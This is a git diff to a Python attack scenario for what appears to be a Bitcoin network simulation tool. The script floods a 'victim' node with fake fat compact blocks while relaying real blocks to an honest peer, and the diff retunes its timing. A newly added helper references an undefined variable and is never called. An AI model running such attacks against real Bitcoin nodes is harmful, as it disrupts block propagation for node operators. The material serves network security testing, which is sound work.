@@ -1,5 +1,9 @@
 #!/usr/bin/env python3
 
+from pprint import (
+    pp,
+)
+
 import random
 import socket
 from datetime import (
@@ -44,8 +48,6 @@ class CmpctAtk(Commander):
         )
         parser.usage = "warnet run scenarios/cmpctatk.py"
 
-
-
     def connect_to_hostname(self, hostname):
         # regtest or signet
         chain = self.nodes[0].chain
@@ -78,6 +80,15 @@ class CmpctAtk(Commander):
 
         return cmpct_block
 
+    def check_getdata_received_for_hash(self, conn, hash):
+        """Waits for a getdata message.
+
+        The object hashes in the inventory vector must match the provided hash_list."""
+        last_data = self.last_message.get("getdata")
+        if not last_data:
+            return False
+        return [x.hash for x in last_data.inv] == hash_list
+
     def run_test(self):
         victim = "tank1"
         honest = "tank2"
@@ -94,30 +105,34 @@ class CmpctAtk(Commander):
         real_block = self.build_block_on_tip(self.nodes[0])
         attack_block = self.build_fat_empty_cmpct(real_block)
         attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
-        next_block_interrupt_time = datetime.now() + timedelta(seconds=30)
+        next_block_interrupt_time = datetime.now() + timedelta(seconds=20)
+        honestpeer_received = False
         while True:
             now = datetime.now()
-            if now > next_block_interrupt_time:
+            if honestpeer_received and now > next_block_interrupt_time:
+                print("Timeout reached, refreshing attack block.")
                 real_block = self.build_block_on_tip(self.nodes[0])
                 attack_block = self.build_fat_empty_cmpct(real_block)
                 attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
-                next_block_interrupt_time = datetime.now() + timedelta(seconds=30)
+                next_block_interrupt_time = datetime.now() + timedelta(seconds=15)
+                honestpeer_received = False
 
             for victim_conn in attackers:
                 victim_conn.send_message(attack_block_msg)
 
             honestpeer_getdata = honestpeer.last_message.get("getdata")
-            if honestpeer_getdata is not None:
-                print(f"Inv hash: {honestpeer_getdata.inv[0].hash}")
-                print(f"expected hash: {real_block.hash}")
 
-            if honestpeer_getdata is not None and any(inv.hash == real_block.hash for inv in honestpeer_getdata.inv):
-                print("This never happens!")
-                honestpeer.send_and_ping(msg_block(real_block))
-            else:
-                headers_message = msg_headers()
-                headers_message.headers = [CBlockHeader(real_block)]
-                honestpeer.send_message(headers_message)
+            # If the honest peer has not already received the block, and has
+            # requested the block after receiving the header from us: send the block.
+            if next_block_interrupt_time - now > timedelta(seconds=10):
+                if not honestpeer_received and honestpeer_getdata is not None:
+                    honestpeer.send_and_ping(msg_block(real_block))
+                    honestpeer_received = True
+                    print(f"Honest peer sent us a getdata for {real_block.hash} and we responded.")
+                else:  # Otherwise send the header.
+                    headers_message = msg_headers()
+                    headers_message.headers = [CBlockHeader(real_block)]
+                    honestpeer.send_message(headers_message)
 
 
 def main():
